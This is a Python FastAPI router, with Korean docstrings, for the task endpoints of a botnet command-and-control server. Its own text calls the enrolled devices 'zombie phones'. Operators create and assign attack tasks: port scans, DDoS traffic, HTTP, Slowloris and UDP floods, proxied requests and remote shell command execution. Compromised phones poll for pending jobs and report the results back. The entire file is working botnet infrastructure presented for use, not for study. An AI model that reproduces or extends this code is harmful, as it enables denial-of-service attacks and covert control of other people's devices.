from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from typing import List
from core.database import get_db
from api.schemas.task import TaskCreate, TaskResponse, TaskUpdate
from api.dependencies import verify_node_auth
from services.task_service import TaskService
from models.task import TaskStatus
from models.node import Node

router = APIRouter(prefix="/api/tasks", tags=["tasks"])


@router.post("/", response_model=TaskResponse)
async def create_task(
    task_data: TaskCreate,
    db: AsyncSession = Depends(get_db)
):
    """
    새 작업(공격) 생성

    좀비폰들에게 시킬 작업을 만듭니다. Commander CLI에서 자동으로 호출됩니다.

    **작업 타입:**
    - `port_scan`: 포트 스캔 공격
    - `traffic_gen`: 트래픽 생성 (DDoS)
    - `http_flood`: HTTP Flood 공격
    - `slowloris`: Slowloris 공격
    - `udp_flood`: UDP Flood 공격
    - `proxy_request`: 프록시를 통한 요청
    - `execute_command`: 쉘 명령 실행
    - `custom`: 커스텀 작업

    **요청 예시 - 포트 스캔:**
    ```json
    {
        "task_type": "port_scan",
        "parameters": {
            "target": "192.168.1.1",
            "start_port": 1,
            "end_port": 1000
        },
        "assigned_node_id": "abc123..."  // 또는 null이면 브로드캐스트
    }
    ```

    **요청 예시 - HTTP Flood:**
    ```json
    {
        "task_type": "http_flood",
        "parameters": {
            "target_url": "http://example.com",
            "duration": 60,
            "requests_per_second": 10
        }
    }
    ```
    """
    task = await TaskService.create_task(db, task_data)
    return task


@router.get("/", response_model=List[TaskResponse])
async def get_all_tasks(
    status: TaskStatus = None,
    db: AsyncSession = Depends(get_db)
):
    """
    모든 작업 목록 조회

    생성된 모든 작업들의 상태를 확인합니다.

    **사용법:**
    - 전체: `GET /api/tasks/`
    - 대기중만: `GET /api/tasks/?status=pending`
    - 실행중만: `GET /api/tasks/?status=running`
    - 완료만: `GET /api/tasks/?status=completed`
    - 실패만: `GET /api/tasks/?status=failed`

    **응답:** 작업 목록 (타입, 상태, 결과, 실행한 폰 등)
    """
    tasks = await TaskService.get_all_tasks(db, status)
    return tasks


@router.get("/pending", response_model=List[TaskResponse])
async def get_pending_tasks(
    current_node: Node = Depends(verify_node_auth),
    db: AsyncSession = Depends(get_db)
):
    """
    내 폰에 할당된 대기중 작업 가져오기

    폰이 주기적으로 호출해서 할 일이 있는지 확인합니다.
    작업이 있으면 가져가서 실행하고 결과를 업데이트합니다.

    **인증:** Header에 `X-API-Key: {api_key}` 필요

    **응답:** 이 폰에 할당된 pending 상태 작업들
    """
    tasks = await TaskService.get_pending_tasks(db, current_node.node_id)
    return tasks


@router.get("/{task_id}", response_model=TaskResponse)
async def get_task(
    task_id: str,
    db: AsyncSession = Depends(get_db)
):
    """
    특정 작업 상세 조회

    task_id로 작업의 자세한 정보와 결과를 확인합니다.

    **사용법:** `GET /api/tasks/{task_id}`
    """
    task = await TaskService.get_task_by_id(db, task_id)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    return task


@router.patch("/{task_id}", response_model=TaskResponse)
async def update_task(
    task_id: str,
    task_update: TaskUpdate,
    current_node: Node = Depends(verify_node_auth),
    db: AsyncSession = Depends(get_db)
):
    """
    작업 상태 업데이트 (폰이 결과 보고)

    폰이 작업을 완료하면 결과를 이 API로 보고합니다.

    **요청 예시:**
    ```json
    {
        "status": "completed",
        "result": {
            "open_ports": [22, 80, 443, 8080],
            "scan_duration": 45.2
        }
    }
    ```

    **인증:** 자기한테 할당된 작업만 업데이트 가능
    """
    task = await TaskService.get_task_by_id(db, task_id)

    if not task:
        raise HTTPException(status_code=404, detail="Task not found")

    if task.assigned_node_id != current_node.node_id:
        raise HTTPException(status_code=403, detail="Task not assigned to this node")

    updated_task = await TaskService.update_task(db, task_id, task_update)
    return updated_task


@router.post("/{task_id}/assign/{node_id}", response_model=TaskResponse)
async def assign_task(
    task_id: str,
    node_id: str,
    db: AsyncSession = Depends(get_db)
):
    """
    특정 폰에 작업 할당

    이미 생성된 작업을 특정 폰에 할당합니다.

    **사용법:** `POST /api/tasks/{task_id}/assign/{node_id}`

    **언제 씀:** 작업을 만들 때 폰을 지정 안 했으면 나중에 이 API로 할당
    """
    task = await TaskService.assign_task(db, task_id, node_id)
    if not task:
        raise HTTPException(status_code=404, detail="Task not found")
    return task
